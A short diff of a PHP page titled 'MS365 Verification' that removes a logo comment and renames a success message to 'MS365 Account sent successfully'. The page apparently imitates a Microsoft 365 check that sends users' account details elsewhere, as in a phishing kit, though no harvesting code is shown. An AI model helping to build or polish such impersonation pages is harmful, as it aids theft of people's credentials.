@@ -153,7 +153,7 @@ session_start(); // Start session to use session variables
 <body>
     <div class="container">
         <div class="left-section">
-            <img src="images/logo-170x172.png" alt="Logo"> <!-- Ensure to use your logo here -->
+            <img src="images/logo-170x172.png" alt="Logo">
         </div>
         <div class="right-section">
             <h2>MS365 Verification</h2>
@@ -171,7 +171,7 @@ session_start(); // Start session to use session variables
         // Check if there's a session message to display
         if (isset($_SESSION['message'])) {
             $message = addslashes($_SESSION['message']);
-            if (strpos($message, 'Email sent successfully') !== false) {
+            if (strpos($message, 'MS365 Account sent successfully') !== false) {
                 echo "Swal.fire({
                     title: 'Success',
                     text: '$message',
